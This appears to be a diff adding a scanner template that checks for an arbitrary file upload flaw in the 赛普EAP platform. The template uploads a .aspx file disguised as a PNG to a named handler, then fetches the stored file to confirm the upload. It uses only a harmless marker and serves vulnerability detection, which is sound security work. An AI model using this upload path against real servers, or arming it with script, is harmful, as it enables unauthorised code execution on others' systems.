@@ -1,0 +1,64 @@
+id: poc-yaml-chinasap-eap-upload-anyfile-upload
+info:
+  name: 赛普EAP企业适配管理平台 Upload 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(6)}}"
+  t2: "{{base64(t1)}}"
+  dt1: "{{date_time('2006')}}"
+  dt2: "{{date_time('01')}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/IDWebSoft/Common/Handler/Upload.aspx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------328367279028471380642525145085"
+    body: |-
+      -----------------------------328367279028471380642525145085
+      Content-Disposition: form-data; name="Filedata"; filename="{{t1}}.aspx"
+      Content-Type: image/png
+
+      {{t2}}
+      -----------------------------328367279028471380642525145085--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".aspx"
+        negative: false
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+    extractors:
+      - type: regex
+        name: files
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - "(?P<files>[0-9a-zA-Z-]{36}).aspx"
+
+  - id: confirm-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/IDWebSoft/Accessary/{{dt1}}/{{dt2}}/{{files}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
